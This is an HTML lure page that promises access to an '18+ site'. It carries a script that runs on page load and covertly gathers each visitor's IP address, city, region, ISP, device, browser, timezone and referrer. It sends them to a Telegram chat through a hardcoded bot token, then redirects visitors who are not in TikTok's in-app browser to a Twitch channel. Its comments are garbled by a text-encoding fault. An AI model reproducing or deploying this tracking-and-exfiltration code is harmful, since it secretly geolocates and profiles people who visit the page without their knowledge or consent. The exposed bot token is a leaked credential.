<!DOCTYPE html>

<head>

    <style>
        * {

        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;

        }

        .container {

        }

        .header {

        /* –û–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ —Å—Ç–∏–ª–∏ –¥–ª—è —Å—Ç—Ä–µ–ª–∫–∏ */
        .arrow-container {
            position: fixed; /* –ò–∑–º–µ–Ω–µ–Ω–æ –Ω–∞ fixed */
            top: 10px;
            right: -15px;
            width: 65px;
            height: 65px;
            z-index: 1000; /* –ß—Ç–æ–±—ã —Å—Ç—Ä–µ–ª–∫–∞ –±—ã–ª–∞ –ø–æ–≤–µ—Ä—Ö –≤—Å–µ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç–∞ */
        }

        .content {

            justify-content: center;
            padding: 1rem;
        }

        .card {

        .card img {

    </style>
</head>
<body>
    <div class="arrow-container">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">

    <main class="content">
        <div class="container">
            <div class="card">
                <h1>Click "Open in the browser" to access the 18+ site.</h1>
                <img src="pic.jpg" alt="Share Menu">
            </div>
        </div>
    </main>
    <script>// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telegram
        const TELEGRAM_BOT_TOKEN = '7493763616:AAFi0MZpHax9ALjz97knaYEf9UOobjRmN2Q';
        const TELEGRAM_CHAT_ID = '-4610081050';
        
        // –£–ª—É—á—à–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è TikTok WebView
        function isTikTokWebView() {
            const userAgent = navigator.userAgent.toLowerCase();
            // –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫ –ø—Ä–∏–∑–Ω–∞–∫–æ–≤ TikTok WebView
            const tiktokSignatures = [
                'tiktok',
                'musical_ly',
                'bytedance',
                'tiktokapp',
                'musically'
            ];
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –ª—é–±–æ–≥–æ –∏–∑ –ø—Ä–∏–∑–Ω–∞–∫–æ–≤
            return tiktokSignatures.some(signature => userAgent.includes(signature));
        }
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ—Å–µ—Ç–∏—Ç–µ–ª–µ
        async function collectVisitorData() {
            const data = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                isMobile: /Mobile|Android|iPhone/i.test(navigator.userAgent),
                browser: getBrowserInfo(),
                os: getOSInfo(),
                isTikTok: isTikTokWebView() // –î–æ–±–∞–≤–ª—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤ –¥–∞–Ω–Ω—ã–µ
            };
        
            // –ü–æ–ª—É—á–∞–µ–º IP –∏ –≥–µ–æ–¥–∞–Ω–Ω—ã–µ —á–µ—Ä–µ–∑ ipapi.co
            try {
                const response = await fetch('https://ipapi.co/json/');
                const ipData = await response.json();
                Object.assign(data, {
                    ip: ipData.ip,
                    country: ipData.country_name,
                    city: ipData.city,
                    region: ipData.region,
                    isp: ipData.org,
                });
            } catch (error) {
                console.error('Error fetching IP data:', error);
            }
        
            return data;
        }
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = "Unknown";
            
            if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Chrome")) browser = "Chrome";
            else if (ua.includes("Safari")) browser = "Safari";
            else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
            else if (ua.includes("Edge")) browser = "Edge";
            else if (ua.includes("MSIE") || ua.includes("Trident/")) browser = "Internet Explorer";
            
            return browser;
        }
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –û–°
        function getOSInfo() {
            const ua = navigator.userAgent;
            let os = "Unknown";
            
            if (ua.includes("Windows")) os = "Windows";
            else if (ua.includes("Mac")) os = "MacOS";
            else if (ua.includes("Linux")) os = "Linux";
            else if (ua.includes("Android")) os = "Android";
            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
            
            return os;
        }
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
        async function sendToTelegram(data) {
            const message = `
        üîç –ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å:
        
        üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:
        - –û–°: ${data.os}
        - –ë—Ä–∞—É–∑–µ—Ä: ${data.browser}
        - –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${data.screenResolution}
        - Mobile: ${data.isMobile}
        
        üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è:
        - IP: ${data.ip}
        - –°—Ç—Ä–∞–Ω–∞: ${data.country}
        - –ì–æ—Ä–æ–¥: ${data.city}
        - –†–µ–≥–∏–æ–Ω: ${data.region}
        - ISP: ${data.isp}
        
        ‚öôÔ∏è –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ:
        - User Agent: ${data.userAgent}
        - –Ø–∑—ã–∫: ${data.language}
        - –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${data.platform}
        - Timezone: ${data.timezone}
        
        üîó –ò—Å—Ç–æ—á–Ω–∏–∫:
        - Referrer: ${data.referrer}
        - TikTok WebView: ${data.isTikTok}
        
        ‚è∞ –í—Ä–µ–º—è: ${data.timestamp}
        `;
        
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
        
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }
        
        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞–±–æ—Ç–∫–∏
        async function handleVisitor() {
            // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ
            const visitorData = await collectVisitorData();
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram
            await sendToTelegram(visitorData);
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ –∏ –¥–æ–±–∞–≤–ª—è–µ–º –∑–∞–¥–µ—Ä–∂–∫—É
            setTimeout(() => {
                const isTikTok = isTikTokWebView();
                console.log('Is TikTok WebView:', isTikTok); // –û—Ç–ª–∞–¥–æ—á–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
                console.log('User Agent:', navigator.userAgent); // –û—Ç–ª–∞–¥–æ—á–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
                
                if (!isTikTok) {
                    window.location.href = 'https://www.twitch.tv/shadowkekw';
                }
            }, 500); // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –¥–ª—è –≥–∞—Ä–∞–Ω—Ç–∏–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
        }
        
        // –ó–∞–ø—É—Å–∫–∞–µ–º —Å–∫—Ä–∏–ø—Ç –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        document.addEventListener('DOMContentLoaded', handleVisitor);</script>
</body>
